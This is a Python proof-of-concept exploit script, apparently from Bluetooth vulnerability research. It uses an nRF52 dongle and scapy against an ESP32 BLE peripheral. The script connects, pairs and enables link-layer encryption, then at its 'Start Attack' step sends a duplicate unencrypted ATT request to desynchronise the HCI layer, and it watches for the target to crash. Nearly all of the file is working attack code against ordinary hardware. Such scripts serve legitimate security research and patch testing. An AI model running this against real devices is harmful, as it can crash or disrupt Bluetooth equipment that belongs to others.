#!/usr/bin/python
import os
import platform
import sys
from binascii import hexlify
from time import sleep

# extra libs
sys.path.insert(0, os.getcwd() + '/libs')
import BLESMPServer
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from scapy.utils import raw
from timeout_lib import start_timeout, disable_timeout, update_timeout
from Crypto.Cipher import AES

# Default master address
master_address = '5d:36:ac:90:0b:20'
access_address = 0x9a328370
# Normal pairing request for secure pairing (uncomment the following to choose pairing request method)
# pairing_iocap = 0x01  # DisplayYesNo
# pairing_iocap = 0x03  # NoInputNoOutput
pairing_iocap = 0x04  # KeyboardDisplay
paring_auth_request = 0x00  # No bounding
# paring_auth_request = 0x01  # Bounding
# paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
# paring_auth_request = 0x04 | 0x01  # MITM + bounding
# paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding

# Internal vars
SCAN_TIMEOUT = 2
none_count = 0
end_connection = False
connecting = False
conn_skd = None
conn_iv = None
conn_ltk = None
conn_tx_packet_counter = 0
conn_rx_packet_counter = 0
encryption_enabled = False
pairing_procedure = False
run_script = True
CRASH_TIMEOUT = 6.0

# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].upper()
else:
    advertiser_address = 'A4:C1:38:D8:AD:B8'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    global run_script

    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    disable_timeout('scan_timeout')
    run_script = False


def scan_timeout():
    global connecting
    connecting = False
    scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)


def set_security_settings(pkt):
    global paring_auth_request
    # Change security parameters according to slave security request
    # paring_auth_request = pkt[SM_Security_Request].authentication
    print(Fore.YELLOW + 'Slave requested authentication of ' + hex(pkt[SM_Security_Request].authentication))
    print(Fore.YELLOW + 'We are using authentication of ' + hex(paring_auth_request))


def bt_crypto_e(key, plaintext):
    aes = AES.new(key, AES.MODE_ECB)
    return aes.encrypt(str(plaintext))


def send_encrypted(pkt):
    global conn_tx_packet_counter

    raw_pkt = bytearray(raw(pkt))
    aa = raw_pkt[:4]
    header = raw_pkt[4]  # Get ble header
    length = raw_pkt[5] + 4  # add 4 bytes for the mic
    crc = '\x00\x00\x00'  # Dummy CRC (Dongle automatically calculates it)

    pkt_count = bytearray(struct.pack("<Q", conn_tx_packet_counter)[:5])  # convert only 5 bytes
    pkt_count[4] |= 0x80  # Set for master -> slave
    nonce = pkt_count + conn_iv

    aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
    aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

    enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
    conn_tx_packet_counter += 1  # Increment packet counter
    driver.raw_send(aa + chr(header) + chr(length) + enc_pkt + mic + crc)
    print(Fore.YELLOW + "TX ---> [Encrypted]{" + pkt.summary()[7:] + '}')


def receive_encrypted(pkt):
    global conn_rx_packet_counter
    raw_pkt = bytearray(raw(pkt))
    aa = raw_pkt[:4]
    header = raw_pkt[4]  # Get ble header
    length = raw_pkt[5]  # add 4 bytes for the mic

    if length is 0 or length < 5:
        # ignore empty PDUs
        return pkt
    # Subtract packet length 4 bytes of MIC
    length -= 4
    # Update nonce before decrypting
    pkt_count = bytearray(struct.pack("<Q", conn_rx_packet_counter)[:5])  # convert only 5 bytes
    pkt_count[4] &= 0x7F  # Clear bit 7 for slave -> master
    nonce = pkt_count + conn_iv

    aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
    aes.update(chr(header & 0xE3))  # Calculate mic over header cleared of NES, SN and MD

    dec_pkt = aes.decrypt(raw_pkt[6:-4 - 3])  # get payload and exclude 3 bytes of crc
    conn_rx_packet_counter += 1
    try:
        mic = raw_pkt[6 + length: -3]  # Get mic from payload and exclude crc
        aes.verify(mic)

        return BTLE(aa + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')
    except Exception as e:
        print(Fore.RED + "MIC Wrong: " + e)
        return BTLE(aa + chr(header) + chr(length) + dec_pkt + '\x00\x00\x00')


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='logs/esp32_hci_desync.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while run_script:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        if encryption_enabled:
            pkt = BTLE(data)
            pkt = receive_encrypted(pkt)  # Decrypt Link Layer
        else:
            pkt = BTLE(data)  # Receive plain text Link Layer
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt:
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')
            if BTLE_EMPTY_PDU not in pkt:
                # Print slave data channel PDUs summary
                print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if BTLE_SCAN_RSP in pkt and pkt.AdvA == advertiser_address.lower() and connecting == False:
            connecting = True
            update_timeout('scan_timeout')
            update_timeout('crash_timeout')
            conn_rx_packet_counter = 0
            conn_tx_packet_counter = 0
            encryption_enabled = False
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=pkt.TxAdd, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell Bluetooth SIG as this is forbidden by
            # them!!!
            driver.send(conn_request)
            # Start the timeout to detect crashes
            start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)

        elif BTLE_EMPTY_PDU in pkt:

            pass

        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
            if SM_Security_Request in pkt:
                set_security_settings(pkt)
            # Send Feature request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                feature_set='le_encryption+le_data_len_ext')
            driver.send(pkt)

        elif SM_Security_Request in pkt:
            set_security_settings(pkt)

        elif LL_FEATURE_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt)

        elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
            pkt = BTLE(access_addr=access_address) / \
                  BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Exchange_MTU_Request(mtu=247)
            driver.send(pkt)

        elif ATT_Exchange_MTU_Response in pkt:
            # Send version indication request
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), master_address.split(':')))
            slave_address_raw = ''.join(map(lambda x: chr(int(x, 16)), advertiser_address.split(':')))
            BLESMPServer.configure_connection(master_address_raw, slave_address_raw, 0,
                                              pairing_iocap, paring_auth_request)
            hci_res = BLESMPServer.pairing_request()
            if hci_res:
                pairing_procedure = True
                # Pairing request
                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                driver.send(pkt)

        elif pairing_procedure and SM_Hdr in pkt:
            # Handle pairing response and so on
            smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / pkt[SM_Hdr]))
            if smp_answer is not None and isinstance(smp_answer, list):
                for res in smp_answer:
                    res = HCI_Hdr(res)  # type: HCI_Hdr
                    if SM_Hdr in res:
                        pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
                        if encryption_enabled:
                            send_encrypted(pkt)
                        else:
                            driver.send(pkt)

                    elif HCI_Cmd_LE_Start_Encryption_Request in res:
                        conn_ltk = res.ltk
                        print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).upper())
                        conn_iv = '\x00' * 4  # set IVm (IV of master)
                        conn_skd = '\x00' * 8  # set SKDm (session key diversifier part of master)
                        enc_request = BTLE(
                            access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_ENC_REQ(ediv='\x00',
                                                                                               rand='\x00',
                                                                                               skdm=conn_iv,
                                                                                               ivm=conn_skd)
                        driver.send(enc_request)

        elif LL_ENC_RSP in pkt:
            # Get IVs and SKDs from slave encryption response
            conn_skd += pkt[LL_ENC_RSP].skds  # SKD = SKDm || SKDs
            conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
            conn_session_key = bt_crypto_e(conn_ltk[::-1], conn_skd[::-1])
            conn_packet_counter = 0
            print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd))
            print(Fore.GREEN + 'Received  IV: ' + hexlify(conn_iv))
            print(Fore.GREEN + 'Stored   LTK: ' + hexlify(conn_ltk))
            print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key))


        # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
        elif LL_START_ENC_REQ in pkt:
            encryption_enabled = True
            pairing_procedure = False
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
            send_encrypted(pkt)

        elif LL_START_ENC_RSP in pkt:
            print(Fore.GREEN + 'Link Encrypted')
            # Start Attack
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / \
                  ATT_Read_By_Type_Request(start=8, end=65535, uuid=10243)
            encryption_enabled = False
            send_encrypted(pkt)
            print(Fore.YELLOW + 'Sending same packet unencrypted (MIC will on peripheral)')
            driver.send(pkt)
            end_connection = True

        elif LL_REJECT_IND in pkt or SM_Failed in pkt:
            end_connection = True

        if end_connection:
            end_connection = False
            encryption_enabled = False
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset, malformed packets were sent')

            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)

sleep(0.01)

driver.save_pcap()
print(Fore.GREEN + "Capture saved in logs/esp32_hci_desync.pcap")
